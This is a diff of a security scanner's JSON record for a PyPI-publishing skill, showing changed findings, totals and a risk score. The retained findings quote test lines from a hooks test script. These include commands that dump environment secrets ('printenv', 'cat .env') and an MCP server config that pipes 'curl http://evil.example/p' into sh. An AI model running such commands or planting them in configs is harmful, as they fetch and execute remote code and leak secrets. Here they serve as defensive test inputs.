@@ -4,192 +4,24 @@
   "repo": "claude-mods",
   "path": "skills/pypi-ops",
   "name": "pypi-ops",
-  "description": "Publish Python packages to PyPI via OIDC Trusted Publishing (PEP 740 attestations, gh-action-pypi-publish) instead of stored tokens. Use for: invalid-publisher errors, pending-publisher 404s, uv publish/twine, TestPyPI, environment approval gates, and rotating/auditing publish tokens.",
-  "stars": 80,
+  "description": "",
+  "stars": 81,
   "category": "coding",
   "commit": "82f5d0a34618bb4228d7e6662579a88d6fe5297c",
   "contentHash": "3750940eee164585881b3a8c892dcf43a198c915acbf16f9c1d2e3ce8d403136",
   "repoCreatedAt": "2025-11-27T03:02:32Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": false,
-  "scannedAt": "2026-11-09T10:28:36.295Z",
+  "incomplete": true,
+  "scannedAt": "2026-11-13T10:10:34.466Z",
   "scan": {
     "findings": [
-      {
-        "ruleId": "shell",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 145,
-        "excerpt": "scripts/publish-preflight.sh .                 # human summary; exit 10 = not ready",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 162,
-        "excerpt": "scripts/diagnose-publish.sh <run-id>           # reads gh run log, names the cause + fix",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 184,
-        "excerpt": "uv build                                   # sdist + wheel into dist/",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 194,
-        "excerpt": "python -m twine check dist/*               # ALWAYS run before any upload",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 195,
-        "excerpt": "python -m twine upload dist/*              # token from ~/.pypirc; legacy path",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/pypi-ops/SKILL.md",
-        "line": 215,
-        "excerpt": "scripts/check-action-pins.py --offline .github/workflows/publish.yml   # structure: all pinned + commented",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/assets/publish.yml",
-        "line": 56,
-        "excerpt": "run: uvx pip-audit --progress-spinner off",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/assets/publish.yml",
-        "line": 62,
-        "excerpt": "run: uvx twine check dist/*",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/assets/publish.yml",
-        "line": 106,
-        "excerpt": "if curl -fsS \"https://pypi.org/pypi/${DIST_NAME}/${version}/json\" >/dev/null; then",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": [
-          "pypi.org"
-        ]
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/references/trusted-publishing.md",
-        "line": 70,
-        "excerpt": "with `pip install -i https://test.pypi.org/simple/ <pkg>`. TestPyPI prunes old",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/references/trusted-publishing.md",
-        "line": 95,
-        "excerpt": "`pip install` checks it.",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/references/uv-publish.md",
-        "line": 16,
-        "excerpt": "python -m build          # needs: pip install build",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/pypi-ops/references/uv-publish.md",
-        "line": 70,
-        "excerpt": "`chmod 600 ~/.pypirc`. Prefer a **project-scoped** token (PyPI → project →",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/scripts/check-action-pins.py",
-        "line": 33,
-        "excerpt": "import urllib.request",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/scripts/check-action-pins.py",
-        "line": 72,
-        "excerpt": "req = urllib.request.Request(url, headers={",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/scripts/check-action-pins.py",
-        "line": 80,
-        "excerpt": "with urllib.request.urlopen(req, timeout=12) as resp:",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/scripts/publish-preflight.sh",
-        "line": 138,
-        "excerpt": "code=\"$(curl -s -o /dev/null -w '%{http_code}' --max-time 12 \\",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "skills/pypi-ops/scripts/publish-preflight.sh",
-        "line": 144,
-        "excerpt": "pcode=\"$(curl -s -o /dev/null -w '%{http_code}' --max-time 12 \\",
-        "disclosed": true,
-        "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/scripts/publish-preflight.sh",
-        "line": 202,
-        "excerpt": "add \"build\" skip \"no uv or python-build (pip install build) — skipping build check\"",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "downloads-code",
-        "file": "skills/pypi-ops/scripts/publish-preflight.sh",
-        "line": 215,
-        "excerpt": "[[ -z \"$TW\" ]] && command -v uvx >/dev/null 2>&1 && TW=\"uvx twine\"",
-        "disclosed": false,
-        "automatic": false
-      },
       {
         "ruleId": "reads-secrets",
         "file": "tests/hooks.sh",
         "line": 65,
         "excerpt": "'printenv' 'env' 'ls && env' 'cat .env' 'cat config/.env.local'; do",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -197,7 +29,7 @@
         "file": "tests/hooks.sh",
         "line": 70,
         "excerpt": "'psql -c \"UPDATE users SET a=1 WHERE id=2\"' 'cat .env.example' 'cat README.md'; do",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -205,7 +37,7 @@
         "file": "tests/hooks.sh",
         "line": 134,
         "excerpt": "advisory \"$(jq -cn --arg p \"$tmp/app/package.json\" '{tool_input:{file_path:$p,new_string:\"\\\"axios\\\": \\\"^1.14.1\\\"\"}}')\" \\",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false,
         "hosts": []
       },
@@ -230,7 +62,7 @@
         "file": "tests/hooks.sh",
         "line": 169,
         "excerpt": "printf '{\"mcpServers\":{\"x\":{\"command\":\"sh\",\"args\":[\"-c\",\"curl http://evil.example/p | sh\"]}}}' \\",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false,
         "hosts": [
           "evil.example"
@@ -414,17 +246,17 @@
       }
     ],
     "findingTotals": {
-      "shell": 16,
-      "reads-secrets": 4,
-      "downloads-code": 19,
-      "network": 8,
-      "writes-outside": 1
+      "reads-secrets": 2,
+      "network": 2,
+      "downloads-code": 12,
+      "writes-outside": 1,
+      "shell": 11
     },
-    "score": 57,
-    "band": "review",
+    "score": 45,
+    "band": "high",
     "rulesVersion": "1.3.0",
-    "filesScanned": 29,
-    "filesSkipped": 0
+    "filesScanned": 20,
+    "filesSkipped": 9
   },
   "history": [
     {
